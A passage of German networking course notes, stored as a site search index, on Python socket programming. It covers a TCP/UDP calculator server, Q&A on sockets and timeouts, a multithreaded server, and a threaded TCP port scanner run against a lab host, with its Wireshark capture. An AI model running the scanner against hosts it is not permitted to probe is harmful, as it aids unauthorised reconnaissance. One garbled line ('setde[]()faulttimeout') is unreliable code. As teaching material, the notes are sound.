empfangene_id, ergebnis = struct.unpack(\"!Ii\", antwort)\n    print(f\"Antwort vom Server - ID: {empfangene_id}, Ergebnis: {ergebnis}\")\n</code></pre>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#31-verbinde-auf-server-mit-telnet","title":"3.1 Verbinde auf Server mit Telnet","text":"<p>Ein Test mit Telnet zeigt, dass die Verbindung zum Server erfolgreich hergestellt wird. Telnet sendet jedoch reine Textdaten, w\u00e4hrend der Server bin\u00e4r formatierte Daten <code>struct.pack/unpack)</code> erwartet. Die Verarbeitung schl\u00e4gt daher fehl. Der Server ist nicht f\u00fcr die Nutzung mit Telnet vorgesehen.</p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#tcp-variante","title":"TCP Variante:","text":"<p>Wireshark: </p> <p>Currports: - Serverprozess lauscht auf Port 50000 (<code>LISTENING</code>) - Verbindung w\u00e4hrend der Kommunikation: <code>ESTABLISHED</code></p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#udp-variante","title":"UDP Variante:","text":"<p>Wireshark: </p> <p>Currports: - Serverprozess lauscht auf Port 50000 (<code>LISTENING</code>) - Verbindung w\u00e4hrend der Kommunikation: <code>ESTABLISHED</code></p> <p>TCP-Variante</p> Aktion Codezeile (Client/Server) Paket in Wireshark Erkl\u00e4rung TCP-Verbindung wird aufgebaut <code>client.connect(...)</code> <code>SYN \u2192 SYN-ACK \u2192 ACK</code> Verbindungsaufbau Client sendet Daten <code>client.sendall(msg)</code> <code>PSH, ACK</code> mit Payload Anfrage wird \u00fcbertragen Server antwortet <code>conn.sendall(antwort)</code> <code>PSH, ACK</code> Antwort (ID + Ergebnis) Verbindung wird geschlossen <code>conn.close()</code> <code>FIN, ACK</code> TCP-Teardown <p>UDP-Variante</p> Rolle Funktion Wireshark sichtbar als Client <code>sendto(...)</code> UDP-Paket an Server Server <code>recvfrom(...)</code> empf\u00e4ngt UDP-Paket Server <code>sendto(...)</code> Antwort zur\u00fcck an Client Client <code>recvfrom(...)</code> empf\u00e4ngt Antwort","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#32-allgemeine-fragen","title":"3.2 Allgemeine Fragen","text":"","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#frage-1","title":"Frage 1:","text":"<p>Wie k\u00f6nnen Sie im Client Python-Skript die IP-Adresse und Port-Nummer des verwendeten lokalen Sockets bestimmen (\u201ebestimmen\u201c im Sinne von herausfinden)?</p> <p>\u2705 Antwort: Nach dem Verbindungsaufbau kannst du im Client schreiben: <code>print(client.getsockname())  # z.\u202fB. ('127.0.0.1', 54321)</code> Das gibt dir die lokale IP und Portnummer, die dein Betriebssystem dem Socket zugewiesen hat.</p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#frage-2","title":"Frage 2:","text":"<p>Wann (in welcher Code-Zeile) und woher erh\u00e4lt ein Client seine IP-Adresse und Port-Nummer?</p> <p>\u2705 Antwort: Der Client bekommt die IP &amp; Port automatisch vom Betriebssystem, sobald <code>connect()</code> aufgerufen wird, z.\u202fB.:</p> <p><code>client.connect((HOST, PORT))  # \u2192 Hier wird automatisch ein lokaler Port zugewiesen</code></p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#frage-3","title":"Frage 3:","text":"<p>Wie k\u00f6nnen Sie im Client-Skript die IP-Adresse und Port-Nummer des Sockets setzen?</p> <p>\u2705 Antwort: Statt dem System die Wahl zu \u00fcberlassen, setzt du IP &amp; Port vor dem <code>connect()</code> explizit mit <code>bind()</code>:</p> <p><code>client.bind((\"127.0.0.1\", 12345))  # Festgelegter lokaler Port client.connect((\"127.0.0.1\", 50000))</code></p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#frage-4","title":"Frage 4:","text":"<p>Warum m\u00fcssen Sie Timeouts verwenden und wie funktioniert try \u2026 except? Mit welchem Befehl k\u00f6nnen Sie einen gemeinsamen Timeout f\u00fcr alle Sockets setzen?</p> <p>\u2705 Antwort: - Warum: Damit der Code nicht ewig blockiert, wenn z.\u202fB. kein Server antwortet - <code>recv()</code>, <code>accept()</code> usw. sind sonst blockierende Aufrufe - <code>try ... except</code> f\u00e4ngt z.\u202fB. <code>socket.timeout</code>-Fehler ab:</p> <pre><code>sock.settimeout(5)\n try:\n    data = sock.recv(1024) except socket.timeout:\n    print(\"Timeout beim Empfang\")\n</code></pre> <p>\u2705 Globaler Timeout f\u00fcr alle Sockets: <code>import socket socket.setde[]()faulttimeout(5)</code></p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#frage-5","title":"Frage 5:","text":"<p>Finden Sie experimentell heraus, ob Sie einen Server betreiben k\u00f6nnen, der ECHO-Anfragen auf dem gleichen Port f\u00fcr UDP und TCP beantwortet?</p> <p>\u2705 Antwort: Ja, Wichtig ist dabei, dass du zwei getrennte Sockets mit <code>SOCK_STREAM</code> (TCP) und <code>SOCK_DGRAM</code> (UDP) erstellst. Das OS unterscheidet bei den Protokollen bei Anfragen</p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#33-multithreaded-connections","title":"3.3 Multithreaded Connections","text":"Rechenserver_tcp_multithreadRechenserver-Client_tcp_multithread <pre><code># rechenserver_tcp_multiclient_timeout.py\nimport socket\nimport struct\nimport threading\nimport time\n\nHOST = '127.0.0.1'\nPORT = 50000\nSTOP_FLAG = False\nMAX_LAUFZEIT = 30  # Sekunden\nSOCKET_TIMEOUT = 2  # Sekunden f\u00fcr akzeptieren und recv()\n\ndef berechne(op, zahlen):\n    if op == \"SUM\":\n        return sum(zahlen)\n    elif op == \"PRO\":\n        result = 1\n        for z in zahlen:\n            result *= z\n        return result\n    elif op == \"MIN\":\n        return min(zahlen)\n    elif op == \"MAX\":\n        return max(zahlen)\n    else:\n        return 0\n\ndef receive(conn, addr):\n    conn.settimeout(SOCKET_TIMEOUT)\n    print(f\"[VERBINDUNG] Client {addr} verbunden.\")\n    try:\n        while not STOP_FLAG:\n            try:\n                data = conn.recv(1024)\n                if not data:\n                    print(f\"[TRENNUNG] Client {addr} hat die Verbindung geschlossen.\")\n                    break\n                aufgabe_id = struct.unpack(\"!I\", data[0:4])[0]\n                operation = data[4:7].decode(\"utf-8\")\n                n = struct.unpack(\"!B\", data[7:8])[0]\n                zahlen = [struct.unpack(\"!i\", data[8+i*4:12+i*4])[0] for i in range(n)]\n\n                print(f\"[EMPFANGEN] ID: {aufgabe_id}, OP: {operation}, Zahlen: {zahlen}\")\n\n                result = berechne(operation, zahlen)\n                antwort = struct.pack(\"!Ii\", aufgabe_id, result)\n                conn.sendall(antwort)\n                print(f\"[GESENDET] Ergebnis an {addr}: {result}\")\n            except socket.timeout:\n                continue\n    finally:\n        conn.close()\n\ndef listen(sock):\n    sock.settimeout(SOCKET_TIMEOUT)\n    print(f\"[LAUSCHT] TCP Rechenserver auf {HOST}:{PORT}\")\n    while not STOP_FLAG:\n        try:\n            conn, addr = sock.accept()\n            threading.Thread(target=receive, args=(conn, addr), daemon=True).start()\n        except socket.timeout:\n            continue\n        except Exception as e:\n            print(\"[FEHLER] Beim accept:\", e)\n            break\n\n# Hauptprogramm\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.bind((HOST, PORT))\nsock.listen()\n\nstart_time = time.time()\nserver_thread = threading.Thread(target=listen, args=(sock,))\nserver_thread.start()\n\ntry:\n    while time.time() - start_time &lt; MAX_LAUFZEIT:\n        time.sleep(1)\nfinally:\n    STOP_FLAG = True\n    sock.close()\n    print(\"[ENDE] Server wird beendet.\")\n</code></pre> <pre><code># multi_client_test.py\nimport socket\nimport struct\nimport threading\nimport random\nimport time\n\nHOST = '127.0.0.1'\nPORT = 50000\nNUM_CLIENTS = 10  # Anzahl gleichzeitiger Clients\n\ndef client_task(client_id):\n    aufgabe_id = client_id\n    operation = random.choice([\"SUM\", \"PRO\", \"MIN\", \"MAX\"])\n    zahlen = [random.randint(1, 100) for _ in range(random.randint(3, 6))]\n\n    msg = struct.pack(\"!I\", aufgabe_id)\n    msg += operation.encode(\"utf-8\")\n    msg += struct.pack(\"!B\", len(zahlen))\n    for z in zahlen:\n        msg += struct.pack(\"!i\", z)\n\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((HOST, PORT))\n            print(f\"[Client {client_id}] \u2192 OP: {operation}, Zahlen: {zahlen}\")\n            s.sendall(msg)\n            antwort = s.recv(1024)\n            empfangene_id, ergebnis = struct.unpack(\"!Ii\", antwort)\n            print(f\"[Client {client_id}] \u2190 Ergebnis: {ergebnis}\")\n    except Exception as e:\n        print(f\"[Client {client_id}] Fehler: {e}\")\n\n# Alle Clients starten\nthreads = []\nfor i in range(NUM_CLIENTS):\n    t = threading.Thread(target=client_task, args=(i,))\n    t.start()\n    threads.append(t)\n\n# Warten bis alle fertig\nfor t in threads:\n    t.join()\n\nprint(\"[FERTIG] Alle Clients abgeschlossen.\")\n</code></pre>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#4-portscanner","title":"4. Portscanner","text":"Portscanner TCPPortscanner UDP <pre><code># tcp_portscanner.py\nimport socket\nimport threading\nimport time\n\nTARGET_HOST = '141.37.168.26'  # Zielserver im VPN\nPORT_RANGE = range(1, 51)      # Ports 1-50\nTIMEOUT = 1                    # Socket-Timeout in Sekunden\nMAX_SCAN_TIME = 10             # Max. Scan-Zeit in Sekunden\nContinue = True                # Globales Abbruch-Flag\noffene_ports = []              # Ergebnisliste\nthreads = []\n\ndef scan_port(port):\n    global Continue\n    if not Continue:\n        return\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.settimeout(TIMEOUT)\n            result = s.connect_ex((TARGET_HOST, port))\n            if result == 0:\n                print(f\"[OFFEN] TCP-Port {port}\")\n                offene_ports.append(port)\n    except:\n        pass  # Fehler ignorieren\n\ndef start_scanning():\n    for port in PORT_RANGE:\n        if not Continue:\n            break\n        t = threading.Thread(target=scan_port, args=(port,))\n        t.start()\n        threads.append(t)\n\n# Hauptprogramm\nstart_time = time.time()\nprint(f\"[INFO] Starte TCP-Portscan auf {TARGET_HOST}...\")\n\ntry:\n    start_scanning()\n    while time.time() - start_time &lt; MAX_SCAN_TIME:\n        if all(not t.is_alive() for t in threads):\n            break\n        time.sleep(0.2)\n\nexcept KeyboardInterrupt:\n    print(\"\\n[ABBRUCH] Benutzer hat Scan mit Strg+C gestoppt.\")\n    Continue = False\n\n# Threads beenden\nfor t in threads:\n    t.join()\n\n# Ergebnis\nprint(\"\\n[FERTIG] Offene TCP-Ports:\", offene_ports)\n</code></pre> \ud83e\uddfe TCP Dump anzeigen <pre><code>67  16.341847   141.37.200.3    141.37.168.26   TCP 66  32649 \u2192 3 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n68  16.341870   141.37.200.3    141.37.168.26   TCP 66  32650 \u2192 2 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n69  16.341873   141.37.200.3    141.37.168.26   TCP 66  32651 \u2192 1 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n70  16.341896   141.37.200.3    141.37.168.26   TCP 66  32652 \u2192 4 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n71  16.342203   141.37.200.3    141.37.168.26   TCP 66  32653 \u2192 5 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n72  16.342440   141.37.200.3    141.37.168.26   TCP 66  32654 \u2192 6 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n73  16.342690   141.37.200.3    141.37.168.26   TCP 66  32655 \u2192 7 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n74  16.342950   141.37.200.3    141.37.168.26   TCP 66  32656 \u2192 8 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n75  16.343226   141.37.200.3    141.37.168.26   TCP 66  32657 \u2192 9 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n76  16.343472   141.37.200.3    141.37.168.26   TCP 66  32658 \u2192 10 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n77  16.343743   141.37.200.3    141.37.168.26   TCP 66  32659 \u2192 11 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n78  16.344034   141.37.200.3    141.37.168.26   TCP 66  32660 \u2192 12 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n79  16.344270   141.37.200.3    141.37.168.26   TCP 66  32661 \u2192 13 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n80  16.344513   141.37.200.3    141.37.168.26   TCP 66  32662 \u2192 14 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n81  16.344807   141.37.200.3    141.37.168.26   TCP 66  32663 \u2192 15 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n82  16.345065   141.37.200.3    141.37.168.26   TCP 66  32664 \u2192 16 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n83  16.345344   141.37.200.3    141.37.168.26   TCP 66  32665 \u2192 17 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n84  16.345680   141.37.200.3    141.37.168.26   TCP 66  32666 \u2192 18 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n85  16.346116   141.37.200.3    141.37.168.26   TCP 66  32667 \u2192 19 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n86  16.346450   141.37.200.3    141.37.168.26   TCP 66  32668 \u2192 20 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n87  16.346793   141.37.200.3    141.37.168.26   TCP 66  32669 \u2192 21 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n88  16.347195   141.37.200.3    141.37.168.26   TCP 66  32670 \u2192 22 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n89  16.347484   141.37.200.3    141.37.168.26   TCP 66  32671 \u2192 23 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n90  16.347781   141.37.200.3    141.37.168.26   TCP 66  32672 \u2192 24 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n91  16.348320   141.37.200.3    141.37.168.26   TCP 66  32674 \u2192 26 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n92  16.348605   141.37.200.3    141.37.168.26   TCP 66  32675 \u2192 27 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n93  16.348863   141.37.200.3    141.37.168.26   TCP 66  32676 \u2192 28 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n94  16.349075   141.37.200.3    141.37.168.26   TCP 66  32677 \u2192 29 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n95  16.349597   141.37.200.3    141.37.168.26   TCP 66  32678 \u2192 30 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n96  16.349850   141.37.200.3    141.37.168.26   TCP 66  32679 \u2192 31 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n97  16.350108   141.37.200.3    141.37.168.26   TCP 66  32680 \u2192 32 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n98  16.350153   141.37.200.3    141.37.168.26   TCP 66  32681 \u2192 25 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=4 SACK_PERM\n99  16.350341   141.37.200.3    141.37.168.26   TCP 66  32682 \u2192 33 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n100 16.350632   141.37.200.3    141.37.168.26   TCP 66  32683 \u2192 34 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n101 16.350877   141.37.200.3    141.37.168.26   TCP 66  32684 \u2192 35 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n102 16.351122   141.37.200.3    141.37.168.26   TCP 66  32685 \u2192 36 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n103 16.351362   141.37.200.3    141.37.168.26   TCP 66  32686 \u2192 37 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n104 16.351630   141.37.200.3    141.37.168.26   TCP 66  32687 \u2192 38 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n105 16.351893   141.37.200.3    141.37.168.26   TCP 66  32688 \u2192 39 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n106 16.352145   141.37.200.3    141.37.168.26   TCP 66  32689 \u2192 40 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n107 16.352343   141.37.200.3    141.37.168.26   TCP 66  32690 \u2192 41 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n108 16.352517   141.37.200.3    141.37.168.26   TCP 66  32691 \u2192 42 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n109 16.352709   141.37.200.3    141.37.168.26   TCP 66  32692 \u2192 43 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n110 16.352874   141.37.200.3    141.37.168.26   TCP 66  32693 \u2192 44 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n111 16.353086   141.37.200.3    141.37.168.26   TCP 66  32694 \u2192 45 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n112 16.353225   141.37.200.3    141.37.168.26   TCP 66  32695 \u2192 46 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n113 16.353404   141.37.200.3    141.37.168.26   TCP 66  32696 \u2192 47 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n114 16.353539   141.37.200.3    141.37.168.26   TCP 66  32697 \u2192 48 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n115 16.353722   141.37.200.3    141.37.168.26   TCP 66  32698 \u2192 49 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n116 16.353845   141.37.200.3    141.37.168.26   TCP 66  32699 \u2192 50 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM\n117 16.379216   141.37.168.26   141.37.200.3    TCP 60  3 \u2192 32649 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n118 16.379374   141.37.168.26   141.37.200.3    TCP 60  1 \u2192 32651 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n119 16.379507   141.37.168.26   141.37.200.3    TCP 60  2 \u2192 32650 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n120 16.379608   141.37.168.26   141.37.200.3    TCP 60  4 \u2192 32652 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n121 16.379696   141.37.168.26   141.37.200.3    TCP 60  5 \u2192 32653 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n122 16.379786   141.37.168.26   141.37.200.3    TCP 60  6 \u2192 32654 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n123 16.379854   141.37.168.26   141.37.200.3    TCP 66  7 \u2192 32655 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1380 WS=256 SACK_PERM\n124 16.380058   141.37.200.3    141.37.168.26   TCP 54  32655 \u2192 7 [ACK] Seq=1 Ack=1 Win=262144 Len=0\n125 16.380173   141.37.168.26   141.37.200.3    TCP 66  9 \u2192 32657 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1380 WS=256 SACK_PERM\n126 16.380243   141.37.200.3    141.37.168.26   TCP 54  32655 \u2192 7 [FIN, ACK] Seq=1 Ack=1 Win=262144 Len=0\n127 16.380317   141.37.200.3    141.37.168.26   TCP 54  32657 \u2192 9 [ACK] Seq=1 Ack=1 Win=262144 Len=0\n128 16.380358   141.37.168.26   141.37.200.3    TCP 60  8 \u2192 32656 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n129 16.380510   141.37.168.26   141.37.200.3    TCP 60  10 \u2192 32658 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n130 16.380933   141.37.168.26   141.37.200.3    TCP 60  12 \u2192 32660 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n131 16.381032   141.37.168.26   141.37.200.3    TCP 60  11 \u2192 32659 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n132 16.381156   141.37.168.26   141.37.200.3    TCP 66  13 \u2192 32661 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1380 WS=256 SACK_PERM\n133 16.381181   141.37.200.3    141.37.168.26   TCP 54  32657 \u2192 9 [FIN, ACK] Seq=1 Ack=1 Win=262144 Len=0\n134 16.381282   141.37.200.3    141.37.168.26   TCP 54  32661 \u2192 13 [ACK] Seq=1 Ack=1 Win=262144 Len=0\n135 16.381329   141.37.168.26   141.37.200.3    TCP 60  14 \u2192 32662 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n136 16.381617   141.37.200.3    141.37.168.26   TCP 54  32661 \u2192 13 [FIN, ACK] Seq=1 Ack=1 Win=262144 Len=0\n137 16.381618   141.37.168.26   141.37.200.3    TCP 60  15 \u2192 32663 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n138 16.382041   141.37.168.26   141.37.200.3    TCP 60  16 \u2192 32664 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n139 16.382234   141.37.168.26   141.37.200.3    TCP 66  17 \u2192 32665 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1380 WS=256 SACK_PERM\n140 16.382436   141.37.200.3    141.37.168.26   TCP 54  32665 \u2192 17 [ACK] Seq=1 Ack=1 Win=262144 Len=0\n141 16.382466   141.37.168.26   141.37.200.3    TCP 60  18 \u2192 32666 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n142 16.383407   141.37.168.26   141.37.200.3    TCP 66  19 \u2192 32667 [SYN, ACK] Seq=0 Ack=1 Win=65535 Len=0 MSS=1380 WS=256 SACK_PERM\n143 16.383550   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [ACK] Seq=1 Ack=1 Win=262144 Len=0\n144 16.383618   141.37.168.26   141.37.200.3    TCP 60  20 \u2192 32668 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n145 16.384310   141.37.168.26   141.37.200.3    TCP 60  21 \u2192 32669 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n146 16.384780   141.37.168.26   141.37.200.3    TCP 60  22 \u2192 32670 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n147 16.384850   141.37.168.26   141.37.200.3    TCP 60  23 \u2192 32671 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n148 16.384949   141.37.168.26   141.37.200.3    TCP 60  24 \u2192 32672 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n149 16.385019   141.37.168.26   141.37.200.3    TCP 60  26 \u2192 32674 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n150 16.385205   141.37.168.26   141.37.200.3    TCP 60  27 \u2192 32675 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n151 16.385274   141.37.168.26   141.37.200.3    TCP 60  28 \u2192 32676 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n152 16.385936   141.37.168.26   141.37.200.3    TCP 60  29 \u2192 32677 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n153 16.386376   141.37.168.26   141.37.200.3    TCP 60  30 \u2192 32678 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n154 16.386555   141.37.168.26   141.37.200.3    TCP 60  31 \u2192 32679 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n155 16.386800   141.37.168.26   141.37.200.3    TCP 60  25 \u2192 32681 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n156 16.387036   141.37.168.26   141.37.200.3    TCP 60  32 \u2192 32680 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n157 16.387119   141.37.168.26   141.37.200.3    TCP 60  33 \u2192 32682 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n158 16.387229   141.37.168.26   141.37.200.3    TCP 60  34 \u2192 32683 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n159 16.387735   141.37.168.26   141.37.200.3    TCP 60  36 \u2192 32685 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n160 16.387815   141.37.168.26   141.37.200.3    TCP 60  35 \u2192 32684 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n161 16.388161   141.37.168.26   141.37.200.3    TCP 60  37 \u2192 32686 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n162 16.388397   141.37.168.26   141.37.200.3    TCP 60  38 \u2192 32687 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n163 16.388858   141.37.168.26   141.37.200.3    TCP 60  40 \u2192 32689 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n164 16.389076   141.37.168.26   141.37.200.3    TCP 60  39 \u2192 32688 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n165 16.389305   141.37.168.26   141.37.200.3    TCP 60  42 \u2192 32691 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n166 16.389385   141.37.168.26   141.37.200.3    TCP 60  41 \u2192 32690 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n167 16.389532   141.37.168.26   141.37.200.3    TCP 60  44 \u2192 32693 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n168 16.389612   141.37.168.26   141.37.200.3    TCP 60  43 \u2192 32692 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n169 16.389758   141.37.168.26   141.37.200.3    TCP 60  46 \u2192 32695 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n170 16.389839   141.37.168.26   141.37.200.3    TCP 60  45 \u2192 32694 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n171 16.389980   141.37.168.26   141.37.200.3    TCP 60  48 \u2192 32697 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n172 16.390693   141.37.168.26   141.37.200.3    TCP 60  49 \u2192 32698 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n173 16.390775   141.37.168.26   141.37.200.3    TCP 60  47 \u2192 32696 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n174 16.390894   141.37.168.26   141.37.200.3    TCP 60  50 \u2192 32699 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0\n175 16.404198   141.37.200.3    141.37.168.26   TCP 54  32665 \u2192 17 [FIN, ACK] Seq=1 Ack=1 Win=262144 Len=0\n176 16.404677   141.37.200.3    141.37.168.26   TCP 54  32667 \u2192 19 [FIN, ACK] Seq=1 Ack=1 Win=262144 Len=0\n177 16.416911   141.37.168.26   141.37.200.3    TCP 60  7 \u2192 32655 [ACK] Seq=1 Ack=2 Win=262144 Len=0\n178 16.416969   141.37.168.26   141.37.200.3    TCP 60  7 \u2192 32655 [FIN, ACK] Seq=1 Ack=2 Win=262144 Len=0\n179 16.417018   141.37.200.3    141.37.168.26   TCP 54  32655 \u2192 7 [ACK] Seq=2 Ack=2 Win=262144 Len=0\n180 16.417356   141.37.168.26   141.37.200.3    TCP 60  9 \u2192 32657 [ACK] Seq=1 Ack=2 Win=262144 Len=0\n181 16.417400   141.37.168.26   141.37.200.3    TCP 60  9 \u2192 32657 [FIN, ACK] Seq=1 Ack=2 Win=262144 Len=0\n182 16.417441   141.37.200.3    141.37.168.26   TCP 54  32657 \u2192 9 [ACK] Seq=2 Ack=2 Win=262144 Len=0\n183 16.417601   141.37.168.26   141.37.200.3    DAYTIME 75  DAYTIME Response\n184 16.417654   141.37.200.3    141.37.168.26   TCP 54  32661 \u2192 13 [RST, ACK] Seq=2 Ack=22 Win=0 Len=0\n185 16.417826   141.37.168.26   141.37.200.3    TCP 60  13 \u2192 32661 [FIN, ACK] Seq=22 Ack=1 Win=262144 Len=0\n186 16.417855   141.37.200.3    141.37.168.26   TCP 54  32661 \u2192 13 [RST] Seq=1 Win=0 Len=0\n187 16.418016   141.37.168.26   141.37.200.3    TCP 60  13 \u2192 32661 [ACK] Seq=23 Ack=2 Win=262144 Len=0\n188 16.418037   141.37.200.3    141.37.168.26   TCP 54  32661 \u2192 13 [RST] Seq=2 Win=0 Len=0\n189 16.419631   141.37.168.26   141.37.200.3    TCP 216 17 \u2192 32665 